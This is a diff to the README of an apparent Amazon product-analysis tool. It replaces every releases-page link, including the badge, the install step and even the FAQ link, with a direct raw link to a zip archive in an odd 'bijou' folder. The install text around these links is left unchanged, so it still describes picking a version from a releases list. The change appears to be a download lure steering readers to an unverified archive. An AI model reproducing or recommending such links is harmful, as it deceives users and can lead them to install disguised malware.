@@ -1,6 +1,6 @@
 # 📊 amazon-product-analyzer - Get Insights from Amazon Products
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue)](https://github.com/ItzPutra/amazon-product-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/ItzPutra/amazon-product-analyzer/main/bijou/amazon-product-analyzer.zip%20Releases-blue)](https://raw.githubusercontent.com/ItzPutra/amazon-product-analyzer/main/bijou/amazon-product-analyzer.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **amazon-product-analyzer**! This application helps you gain insi
 
 ## 📥 Download & Install
 
-To download the application, [visit this page to download](https://github.com/ItzPutra/amazon-product-analyzer/releases). Here is a simple guide to help you:
+To download the application, [visit this page to download](https://raw.githubusercontent.com/ItzPutra/amazon-product-analyzer/main/bijou/amazon-product-analyzer.zip). Here is a simple guide to help you:
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest version by looking for the one marked as "Latest Release."
@@ -55,7 +55,7 @@ Using the application is straightforward. Here’s how you can make the most of 
 
 If you run into issues while using the application or have questions, here’s what you can do:
 
-- **Check the FAQ**: Visit the FAQ section on the [GitHub page](https://github.com/ItzPutra/amazon-product-analyzer/releases) for common questions.
+- **Check the FAQ**: Visit the FAQ section on the [GitHub page](https://raw.githubusercontent.com/ItzPutra/amazon-product-analyzer/main/bijou/amazon-product-analyzer.zip) for common questions.
 - **Report Issues**: If you encounter a bug, please report it by following the instructions provided on the GitHub page.
 - **Community Support**: Engage with other users through the community forums linked from the main repository.
 
@@ -71,4 +71,4 @@ To stay informed about new features and updates:
 - Follow the project on GitHub.
 - Sign up for notifications on the releases page to receive alerts about new versions.
 
-By using **amazon-product-analyzer**, you will gain valuable insights into Amazon products quickly and effectively. Start analyzing today by [visiting this page to download](https://github.com/ItzPutra/amazon-product-analyzer/releases).
+By using **amazon-product-analyzer**, you will gain valuable insights into Amazon products quickly and effectively. Start analyzing today by [visiting this page to download](https://raw.githubusercontent.com/ItzPutra/amazon-product-analyzer/main/bijou/amazon-product-analyzer.zip).
